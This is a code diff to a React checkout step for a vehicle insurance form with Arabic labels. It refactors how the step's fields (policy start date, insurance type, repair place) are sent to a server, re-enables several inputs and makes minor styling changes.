@@ -2,13 +2,15 @@
 import { useEffect, useState } from "react";
 import CustomInput from "../CustomInput";
 import { useLocation, useNavigate } from "react-router-dom";
-import { currentPage, sendDataToServer } from "@/context/signals";
-import { handleSubmitTab } from "@/utils/actions";
+import { handleSubmitTab } from "@/lib/actions";
+import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
 
 const StepTwo = () => {
   const { state } = useLocation();
   const [error, setError] = useState({});
   const navigate = useNavigate();
+
+  console.log(state);
 
   const handlePrev = () => {
     navigate("/checkout/1", state);
@@ -17,21 +19,28 @@ const StepTwo = () => {
   const handleNext = (e) => {
     const res = handleSubmitTab(e, setError);
 
+    console.log(res);
+
     const data = { ...state, ...res };
 
-    sendDataToServer(
-      data,
-      "الخطوة الثانية",
-      "الخطوة الثالثة",
-      false,
-      navigate,
-      "/checkout/3",
-      data
-    );
+    if (res)
+      sendDataToServer({
+        data: {
+          "تاريخ بدء الوثيقة": res.date,
+          "نوع التأمين": res.type,
+          "مكان الإصلاح": res.place,
+        },
+        current: "الخطوة الثانية",
+        nextPage: "الخطوة الثالثة",
+        nextPageLink: "/checkout/3",
+        navigate,
+        waitingForAdminResponse: false,
+        state: data,
+      });
   };
 
   useEffect(() => {
-    currentPage.value = "الخطوة الثانية";
+    setCurrentPage("الخطوة الثانية");
   }, []);
 
   return (
@@ -110,7 +119,6 @@ const StepTwo = () => {
             "إذا أردت استخدام المركبة لأغراض شخصية وفي بعض الأوقات ستقوم بنقل ركاب عبر تطبيق أوبر على سبيل المثال فعليك اختيار نقل ركاب"
           }
           biSelect={["ضد الغير", "شامل"]}
-          disabled
         />
 
         <CustomInput
@@ -124,13 +132,12 @@ const StepTwo = () => {
             "القيمة التقديرية للسيارة هي القيمة السوقية للسيارة والتي يتم احتساب التعويض في حالة الفقد الكلي على أساسها"
           }
           type={"number"}
-          disabled
         />
 
         <CustomInput
           error={error}
           setError={setError}
-          styles={"rounded-3xl bg-white p-4 shadow-lg"}
+          styles={"rounded-3xl bg-white p-4 shadow-lg col-start-1"}
           label="مكان الإصلاح"
           id="place"
           tip={
@@ -138,11 +145,10 @@ const StepTwo = () => {
           }
           type={"radio"}
           radio={["الورشة", "الوكالة"]}
-          disabled
         />
       </div>
 
-      <div className="flex items-center gap-2 lg:gap-6 rounded-3xl shadow-[0px_0px_50px_0px_#8080805e] mt-20 mb-10 p-2">
+      <div className="p-2 flex items-center gap-2 lg:gap-6 rounded-3xl shadow-[0px_0px_50px_0px_#8080805e] mt-20 mb-10">
         <p className="text-white font-bold bg-[#76b456] p-4 rounded-t-3xl rounded-br-3xl">
           خصومات خاصة %
         </p>
@@ -155,11 +161,10 @@ const StepTwo = () => {
           terms={
             "اختر هنا إذا كنت تنتمي لإحدى هذه الجهات وذلك للحصول على خصومات خاصة على وثيقة التأمين"
           }
-          disabled
         />
       </div>
 
-      <div className="flex justify-between border-t-2 pt-3">
+      <div className="mt-10 flex justify-between border-t-2 pt-3">
         <button
           className="capitalize w-52 rounded-md font-bold py-3 px-6 bg-gray-200 hover:bg-gray-100 text-gray-800 transition-colors"
           onClick={handlePrev}
